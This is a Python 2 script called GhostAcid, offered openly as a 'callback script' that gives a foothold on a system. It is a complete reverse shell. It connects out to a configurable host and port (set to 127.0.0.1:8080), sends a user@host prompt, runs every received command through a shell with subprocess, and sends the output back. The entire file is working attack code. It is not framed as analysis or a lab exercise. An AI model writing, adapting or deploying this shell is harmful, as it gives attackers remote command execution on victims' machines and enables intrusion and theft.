#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
GhostAcid - A very simple callback script

GhostAcid is a very simple callback script designed to work with a ncat
listener.  It should allow the user to get a foothold onto a system and allow
for further recon and enumeration.

################################################################################

LICENSE:

Copyright (c) 2017 wukawitz

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

################################################################################
################################################################################
################################################################################

# The host to call back to
REMOTE_HOST = "127.0.0.1"

# The port to call back on
REMOTE_PORT = 8080

################################################################################
################################################################################
################################################################################

import socket
import pwd
import os
import subprocess

################################################################################
################################################################################
################################################################################

class Communicate(object):
    """
    Class for communicating with agents
    """

    def __init__(self, **kwargs):
        """
        Communicate constructor
        Arguments:
            host - The host to communicate with
            port - The port number to communicate on
        """
        self.host = kwargs.get("host", "")
        self.port = int(kwargs.get("port", 0))
        self.sock = socket.socket()
        self.hostname = ""
        self.username = ""
        self.dirname = ""
        try:
            self.hostname = socket.gethostname()
            self.username = pwd.getpwuid(os.getuid()).pw_name
        except Exception, e_obj:
            print "[!] ERROR - Communicate.__init__() - {0}" \
                  .format(str(e_obj))

    def _get_prompt(self):
        """
        Create prompt to send back to the server
        """
        prompt = ""
        try:
            dirpath = os.path.dirname(os.path.realpath(__file__))
            if self.hostname and self.username:
                dirpath = os.path.dirname(os.path.realpath(__file__))
                prompt= "{0}@{1} {2} $ ".format(self.username, self.hostname, \
                                                               dirpath)
            else:
                prompt = "cmd {0} $ ".format(dirpath)
        except Exception, e_obj:
            print "[!] ERROR - Communicate._get_prompt() - {0}" \
                  .format(str(e_obj))
        return prompt

    def _run_command(self, **kwargs):
        """
        Run a command on the host
        Arguments:
            command - The command to execute on the system
        """
        result = ""
        try:
            command = kwargs.get("command", "")
            if command.startswith("cd"):
                cd_cmd = str(command.strip()).split(" ")
                cdir = cd_cmd[1:][0]
                if len(cd_cmd) > 1:
                    os.chdir(str(cdir))
            else:
                proc = subprocess.Popen(command,
                                        shell=True,
                                        stdin=subprocess.PIPE,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE,
                                        )
                stdout_value, stderr_value = proc.communicate()
                if stdout_value:
                    result = stdout_value
                else:
                    result = stderr_value
        except Exception, e_obj:
            print "[!] ERROR - Communicate._run_command() - {0}" \
                  .format(str(e_obj))
        return result

    def connect_and_communicate(self, **kwargs):
        """
        Connect to a listener and communicate
        Arguments:
            callback - the callback used to process data received
        """
        try:
            callback = kwargs.get("callback", None)
            self.sock.connect((self.host, self.port))
            while True:
                self.sock.send(self._get_prompt())
                buff_size = 4096
                data = ""
                while True:
                    part = self.sock.recv(buff_size)
                    data += part
                    if len(part) < buff_size:
                        break
                result = self._run_command(command=data)
                self.sock.send(result)
        except Exception, e_obj:
            print "[!] ERROR - Communicate.connect_and_communicate() - {0}" \
                  .format(str(e_obj))

def main():
    """
    The main entrance for application
    """
    c_obj = Communicate(host=REMOTE_HOST, port=REMOTE_PORT)
    c_obj.connect_and_communicate(callback=None)

################################################################################
################################################################################
################################################################################

if __name__ == "__main__":

    main()
